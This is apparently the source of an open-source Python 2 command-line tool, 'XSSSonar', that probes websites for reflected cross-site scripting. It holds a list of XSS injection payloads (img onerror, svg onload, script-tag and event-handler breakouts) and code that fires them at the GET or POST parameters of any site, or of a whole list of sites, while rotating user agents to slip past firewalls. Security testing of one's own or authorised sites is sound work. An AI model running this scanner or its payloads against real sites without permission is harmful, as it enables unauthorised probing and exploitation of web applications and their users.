#!/usr/bin/python
# -*- coding: utf-8 -*-

# Test with Python 2.7.9 on Debian Jessie. I'll write it for Python 3.x maybe.
# Little tool to look for XSS vulnerabilities in a web page.
# pip install fake-useragent

import urllib2
import urllib
import httplib
import re
import os
import os.path
import socket
import ssl
import sys
import signal
import time
from fake_useragent import UserAgent

print '\x1b[1;34;49m' + ' __   __ _____ _____ _____                        ' + '\x1b[0m'
print '\x1b[1;34;49m' + ' \ \ / // ____/ ____/ ____|                       ' + '\x1b[0m'
print '\x1b[1;34;49m' + '  \ V /| (___| (___| (___   ___  _ __   __ _ _ __ ' + '\x1b[0m'
print '\x1b[1;34;49m' + '   > <  \___ \\\\___ \\\\___ \ / _ \| `_ \ / _` | `__|' + '\x1b[0m'
print '\x1b[1;34;49m' + '  / . \ ____) |___) |___) | (_) | | | | (_| | |   ' + '\x1b[0m'
print '\x1b[1;34;49m' + ' /_/ \_\_____/_____/_____/ \___/|_| |_|\__,_|_|   0.1.5a' + '\x1b[0m'
print ''
print ''
print '\x1b[1;34;49m' + '            |_' + '\x1b[0m'
print '\x1b[1;34;49m' + '      _____|~ |____ ' + '\x1b[0m'
print '\x1b[1;34;49m' + '     (  --         ------_,' + '\x1b[0m'
print '\x1b[1;34;49m' + '      `-------------------\'`' + '\x1b[0m'
print ''
print '\x1b[1;39;49m' + '   Made with' + '\x1b[0m' + '\x1b[1;31;49m' + ' ❤' + '\x1b[0m' + '\x1b[1;39;49m' + ' - https://www.github.com/luigigubello' + '\x1b[0m'
print ''

# XSS Payload List

payload_list = []

# payload vector = [z_url, z_search, z_search_a, z_search_b, z_search_c, z_search_script, z_search_script_a, z_search_script_b, z_search_script_c, z_search_script_d, z_url_script, z_payload_script, printp_payload]

# payload scheme
# (['','','','','','"\\\\' + z_search + '",','"\\\\' + z_search + '"}','"\\\\' + z_search + '";','\'' + z_search + '\'','>' + z_search + '<','%27%3C%2Fscript%3E' + z_url,'\'</script>' + z_payload])

payload_list.append(['%27%22%3E%22%27%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm`XSS`%3E','\'">"\'><img src=x onerror=confirm`XSS`>','\'">"\'><img src="x" onerror="confirm`XSS`">','\'">"\'><img Src=x Onerror=confirm`XSS`>','\'\'">"\'\'><img src=x onerror=confirm`XSS`>','"\\\\\'">"\'><img src=x onerror=confirm`XSS`>",','"\\\\\'">"\'><img src=x onerror=confirm`XSS`>"}','"\\\\\'">"\'><img src=x onerror=confirm`XSS`>";','\'\'">"\'><img src=x onerror=confirm`XSS`>\'','','%27%3C%2Fscript%3E%27%22%3E%22%27%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm`XSS`%3E','\'</script>\'">"\'><img src=x onerror=confirm`XSS`>','\'">"\'><img src=x onerror=confirm`XSS`>'])

payload_list.append(['%22%3E%20%3Cscript%3Ealert`XSS`%3C%2Fscript%3E','"> <script>alert`XSS`</script>','','','','"\\\\"> <script>alert`XSS`</script>",','"\\\\"> <script>alert`XSS`</script>"}','"\\\\"> <script>alert`XSS`</script>";','\'"> <script>alert`XSS`</script>\'','','','','"> <script>alert`XSS`</script>'])

payload_list.append(['%27%22%3E%22%27%3E%3Csvg%20onload%3Dconfirm`XSS`%3E','\'">"\'><svg onload=confirm`XSS`>','\'">"\'><svg onload="confirm`XSS`>','\'">"\'><svg Onload=confirm`XSS`>','\'\'">"\'\'><svg onload=confirm`XSS`>','"\\\\\'">"\'><svg onload=confirm`XSS`>",','"\\\\\'">"\'><svg onload=confirm`XSS`>"}','"\\\\\'">"\'><svg onload=confirm`XSS`>";','\'\'">"\'><svg onload=confirm`XSS`>\'','','%27%3C%2Fscript%3E%27%22%3E%22%27%3E%3Csvg%20onload%3Dconfirm`XSS`%3E','\'</script>\'">"\'><svg onload=confirm`XSS`>','\'">"\'><svg onload=confirm`XSS`>'])

payload_list.append(['%22%27%2C%3B%3C%2Fscript%3E%3Cscript%3Econfirm`XSS`%3C%2Fscript%3E','"\',;</script><script>confirm`XSS`</script>','','','','"\\\\"\',;</script><script>confirm`XSS`</script>",','"\\\\"\',;</script><script>confirm`XSS`</script>"}','"\\\\"\',;</script><script>confirm`XSS`</script>";','\'"\',;</script><script>confirm`XSS`</script>\'','','','','"\',;</script><script>confirm`XSS`</script>'])

payload_list.append(['%27%3E%3Csvg%20onload%3Dconfirm`XSS`%3E','\'><svg onload=confirm`XSS`>','\'><svg onload="confirm`XSS`">','\'><svg Onload=confirm`XSS`>','','"\\\\\'><svg onload=confirm`XSS`>",','"\\\\\'><svg onload=confirm`XSS`>"}','"\\\\\'><svg onload=confirm`XSS`>";','\'\'><svg onload=confirm`XSS`>\'','','%27%3C%2Fscript%3E%27%3E%3Csvg%20onload%3Dconfirm`XSS`%3E','\'</script>\'><svg onload=confirm`XSS`>','\'><svg onload=confirm`XSS`>'])

payload_list.append(['%22%3E%3Csvg/onload%3Dconfirm`XSS`//','"><svg/onload=confirm`XSS`//','"><svg/onload="confirm`XSS`"//','"><svg/Onload=confirm`XSS`//','','"\\\\"><svg/onload=confirm`XSS`//",','"\\\\"><svg/onload=confirm`XSS`//"}','"\\\\"><svg/onload=confirm`XSS`//";','\'"><svg/onload=confirm`XSS`//\'','','%27%3C%2Fscript%3E%22%3E%3Csvg/onload%3Dconfirm`XSS`//','\'</script>"><svg/onload=confirm`XSS`//','"><svg/onload=confirm`XSS`//'])

payload_list.append(['%22%3E%3Cdetails%2Fopen%2Fontoggle%3Dconfirm%60XSS%60%3E','"><details/open/ontoggle=confirm`XSS`>','"><details/open/ontoggle="confirm`XSS`">','','','"\\\\"><details/open/ontoggle=confirm`XSS`>",','"\\\\"><details/open/ontoggle=confirm`XSS`>"}','"\\\\"><details/open/ontoggle=confirm`XSS`>";','\'"><details/open/ontoggle=confirm`XSS`>\'','','%27%3C%2Fscript%3E%22%3E%3Cdetails%2Fopen%2Fontoggle%3Dconfirm%60XSS%60%3E','\'</script>"><details/open/ontoggle=confirm`XSS`>','"><details/open/ontoggle=confirm`XSS`>'])

payload_list.append(['%22%20onfocus%3D%22confirm`XSS`%22%20autofocus%3D%22%22','" onfocus="confirm`XSS`" autofocus=""','','" Onfocus="confirm`XSS`" Autofocus=""','','"\\\\" onfocus="confirm`XSS`" autofocus=""",','"\\\\" onfocus="confirm`XSS`" autofocus="""}','"\\\\" onfocus="confirm`XSS`" autofocus=""";','\'" onfocus="confirm`XSS`" autofocus=""\'','>" onfocus="confirm`XSS`" autofocus=""<','','','" onfocus="confirm`XSS`" autofocus=""'])

payload_list.append(['%22%20onclick%3D%22confirm`XSS`%22','" onclick="confirm`XSS`"','','" Onclick="confirm`XSS`"','','"\\\\" onclick="confirm`XSS`"",','"\\\\" onclick="confirm`XSS`""}','"\\\\" onclick="confirm`XSS`"";','\'" onclick="confirm`XSS`"\'','>" onclick="confirm`XSS`"<','','','" onclick="confirm`XSS`"'])

payload_list.append(['%22%20onmouseover%3D%22confirm`XSS`%22','" onmouseover="confirm`XSS`"','','" Onmouseover="confirm`XSS`"','','"\\\\" onmouseover="confirm`XSS`"",','"\\\\" onmouseover="confirm`XSS`""}','"\\\\" onmouseover="confirm`XSS`"";','\'" onmouseover="confirm`XSS`"\'','>" onmouseover="confirm`XSS`"<','','','" onmouseover="confirm`XSS`"'])

payload_list.append(['\\%22-confirm`XSS`//','\\\\"-confirm`XSS`//','','','','','','','\'\\\\"-confirm`XSS`//\'','>\\\\"-confirm`XSS`//<','','','\\"-confirm`XSS`//'])

payload_list.append(['\\%27-confirm`XSS`//','\\\\\'-confirm`XSS`//','','','','','','','"\\\\\'-confirm`XSS`//"','>\\\\\'-confirm`XSS`//<','','','\\\'-confirm`XSS`//'])

payload_list.append(['%22-confirm`XSS`-%22%27-confirm`XSS`-%27','"-confirm`XSS`-"'+'\'' + '-confirm`XSS`-\'','','','','','','','','>"-confirm`XSS`-"'+'\'' + '-confirm`XSS`-\'<','','','"-confirm`XSS`-"'+'\'' + '-confirm`XSS`-\''])

# if you press CTRL+C stop the program
def sigint_handler(signum, frame):
	print '\x1b[1;31;49m' + '\nCtrl+C, exit, bye bye!' + '\x1b[0m'
	sys.exit()
signal.signal(signal.SIGINT, sigint_handler)
 
class MyException(Exception):
    pass

# random user-agent to bypass some firewall
ua = UserAgent()
header = {'User-Agent':str(ua.random)}

# function to inject payload in GET parameter
def url_return(site, list_parameters, i, z_url):

	if len(list_parameters) == 1 and i == 0:
		x = site.split('?' + list_parameters[0] + '=')
		url = str(x[0]) + '?' + list_parameters[0] + '=' + z_url
	elif len(list_parameters) != 1 and i == 0:
		x = site.split('&' + list_parameters[1] + '=')
		y = str(x[0])
		y = y.split('?' + list_parameters[0] + '=')
		url = str(y[0]) + '?' + list_parameters[0] + '=' + z_url + '&' + list_parameters[1] + '=' + str(x[1])
	elif i == (len(list_parameters)-1) and i != 0:
		x = site.split('&' + list_parameters[i] + '=')
		url = str(x[0]) + '&' + list_parameters[i] + '=' + z_url
	else:
		x = site.split('&' + list_parameters[i+1] + '=')
		y = str(x[0])
		y = y.split('&' + list_parameters[i] + '=')
		url = str(y[0]) + '&' + list_parameters[i] + '=' + z_url + '&' + list_parameters[i+1] + '=' + str(x[1])
	return url

# check GET or POST parameters in URL
def url_xss_finder(site, post):

	# look for GET parameters in URL if there isn't POST parameter
	if post == '':
		if re.findall('\?(.*)=', site) != []:

			# search text between first ? and last =
			list_parameters = re.search('\?(.*)=', site)
			list_exist = 1
		else:
			list_parameters = []
			list_exist = 0

		if list_exist == 1:

			# create a list with GET parameters
			list_parameters = list_parameters.group()
			list_parameters = list_parameters.split('&')
			k = 0
			i = 0
			l = len(list_parameters)
			while k < l:
				if (i == 0):
					x = list_parameters[i].split('=')
					x = x[0].split('?')
					x = str(x[1])
					list_parameters[i] = x
					k += 1
					i += 1
				else:
					if ('=' in str(list_parameters[i])):
						x = list_parameters[i].split('=')				
						x = str(x[0])
						list_parameters[i] = x
						k += 1
						i += 1
					else:
						del list_parameters[i]
						k += 1
			print '\x1b[1;39;49m' + '\nThe parameters are: ' + '\x1b[0m' + '\x1b[1;33;49m',list_parameters,'\x1b[0m'
	else:
		list_parameters = [post]

	# test XSS payloads on the list of parameters
	if list_parameters == []:
		print '\x1b[1;31;49m' + '\nParameters not found.' + '\x1b[0m'
	else:
		i = 0
		while (i < len(list_parameters)):
			j = 0
			e_count = 0
			print '\x1b[1;39;49m' + '\nAnalize parameter: ' + '\x1b[0m' + '\x1b[1;33;49m',list_parameters[i],'\n\x1b[0m'
			for x in payload_list:

				# different requests for GET and POST parameters
				if post == '':
					url = url_return(site, list_parameters, i, x[0])
				else:
						payload = {post : x[1]}
						data_payload = urllib.urlencode(payload)
				err = ''
				try:
					if post == '':				
						request = urllib2.Request(url, headers = header)
					else:
						request = urllib2.Request(site, headers = header, data = data_payload)
					urllib2.urlopen(request, timeout = 3)
				except urllib2.URLError as e:
					err = "Page not loaded."
				except socket.timeout as e:
	    				err = "Page not loaded."
				except socket.error as e:
	    				err = "Page not loaded."
				except urllib2.HTTPError as e:
	    				err = "Page not loaded."
				except ssl.SSLError as e:
					err = "Page not loaded."
				except httplib.BadStatusLine as e:
					err = "Page not loaded."
				if err == '':
					html_content = urllib2.urlopen(request).read()
					t = 0
					payload_search_list = []
					while t < 9:
						if x[t+1] != '':
							payload_search_list.append(re.findall(x[t+1], html_content))
							t += 1
						else:
							payload_search_list.append([])
							t += 1
					c = 0
					if payload_search_list[8] != []:
						if post == '':
							url_script = url_return(site, list_parameters, i, x[11])
						else:
							payload_script = {post : x[12]}
							data_payload_script = urllib.urlencode(payload_script)
						err_script = ''
						try:
							if post == '':
	    							request_script = urllib2.Request(url_script, headers = header)
							else:
								request_script = urllib2.Request(site, headers = header, data = data_payload_script)
							urllib2.urlopen(request_script, timeout = 3)
						except urllib2.URLError as e:
							err_script = "Page not loaded."
						except socket.timeout as e:
	    						err_script = "Page not loaded."
						except socket.error as e:
	    						err_script = "Page not loaded."
						except urllib2.HTTPError as e:
	    						err_script = "Page not loaded."
						except ssl.SSLError as e:
							err_script = "Page not loaded."
						except httplib.BadStatusLine as e:
							err_script = "Page not loaded."
						if err_script == '':
							html_content = urllib2.urlopen(request_script).read()
							if post == '':
								payload_search_list.append(re.findall(x[11], html_content))
							else:
								payload_search_list.append(re.findall(x[12], html_content))
							if payload_search_list[9] != []:
								c = 1
					control = 0
					if ((len(payload_search_list[4]) + len(payload_search_list[5]) + len(payload_search_list[6]) + len(payload_search_list[7]) + len(payload_search_list[8])) < len(payload_search_list[0]) or ((len(payload_search_list[4]) + len(payload_search_list[5]) + len(payload_search_list[6]) + len(payload_search_list[7]) + len(payload_search_list[8])) == 0 and payload_search_list[0] != [])):
						control = 1
					if (control == 1 or payload_search_list[5] != [] or payload_search_list[6] != [] or payload_search_list[7] != [] or payload_search_list[8] != []):
						print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',x[12],'\x1b[0m'
						print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
						j = 1
					if c == 1:
						print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',x[11],'\x1b[0m'
						print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
						j = 1
				else:
					e_count += 1

			if j == 0 and e_count < 4:
				print '\x1b[1;32;49m' + 'This parameter doesn\'t seem vulnerable.' + '\x1b[0m'
			if j == 0 and e_count > 3:
				print '\x1b[1;33;49m' + 'Page not loaded. Possible WAF or connection error.' + '\x1b[0m'
			i += 1

# start text user interface
check = raw_input('\x1b[1;39;49m' + '\nType [S] if you want to check a single URL or [L] to check a list of sites: ' + '\x1b[0m')
while (check != 'L' and check != 'l' and check != 'S' and check != 's'):
	check = raw_input('\x1b[1;39;49m' + '\nChoose between the keys [S] or [L]:' + '\x1b[0m')

if (check == 'S' or check == 's'):
	while True:	
		post_check = raw_input('\x1b[1;39;49m' + '\nDo you want to check a POST parameter? [Y/N]: ' + '\x1b[0m')
		while (post_check != 'y' and post_check != 'Y' and post_check != 'n' and check != 'N'):
			post_check = raw_input('\x1b[1;39;49m' + '\nChoose between the keys [Y] or [N]:' + '\x1b[0m')
		if (post_check == 'N' or post_check == 'n'):
			site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
			while (len(site) < 8):
				site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
			http = site.split('//', 1)[:1]
			http = str(http[0])+'//'
			while (http != 'http://' and http != 'https://'):
				site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
				http = site.split('//', 1)[:1]
				http = str(http[0])+'//'
			now = int(time.time())
			post = ''
			url_xss_finder(site, post)
			end = int(time.time()) - now
			print('\x1b[1;39;49m' + '\nTime to check URL: ' + str(end) + ' seconds.' + '\x1b[0m')
		else:
			post = raw_input('\x1b[1;39;49m' + '\nType POST parameter: ' + '\x1b[0m')
			while (post == ''):
				post = raw_input('\x1b[1;39;49m' + '\nPlease insert POST parameter: ' + '\x1b[0m')
			site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
			while (len(site) < 8):
				site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
			http = site.split('//', 1)[:1]
			http = str(http[0])+'//'
			while (http != 'http://' and http != 'https://'):
				site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
				http = site.split('//', 1)[:1]
				http = str(http[0])+'//'
			now = int(time.time())
			url_xss_finder(site, post)
			end = int(time.time()) - now
			print('\x1b[1;39;49m' + '\nTime to check URL: ' + str(end) + ' seconds.' + '\x1b[0m')

if (check == 'L' or check == 'l'):
	post = ''
	listsite = raw_input('\x1b[1;39;49m' + '\nWrite path of list (*.txt): ' + '\x1b[0m')	
	ext = os.path.splitext(listsite)[-1].lower()
	real = os.path.exists(listsite)
	while real != True or ext != '.txt':
		listsite = raw_input('\x1b[1;39;49m' + '\nFormat or file path incorrect.\nWrite path of list (*.txt): ' + '\x1b[0m')
		ext = os.path.splitext(listsite)[-1].lower()
		real = os.path.exists(listsite)
	open_file = open(listsite)
	open_file = open_file.readlines()
	num_url = 1
	now = int(time.time())
	for lines in open_file[0:]:
		print '\x1b[1;39;49m' + '\nCheck URL n.' + str(num_url) + ': ' + lines[:-1] + '\x1b[0m'
		if len(lines) < 8:
			print '\x1b[1;31;49m' + '\nURL not valid.' + '\x1b[0m'
			num_url += 1
			continue
		http = lines.split('//', 1)[:1]
		http = str(http[0])+'//'
		if (http != 'http://' and http != 'https://'):
			print '\x1b[1;31;49m' + '\nURL not valid.' + '\x1b[0m'
			num_url += 1
			continue
		url_xss_finder(lines, post)
		num_url += 1
	end = int(time.time()) - now
	print('\x1b[1;39;49m' + '\nTime to check list: ' + str(end) + ' seconds.' + '\x1b[0m')
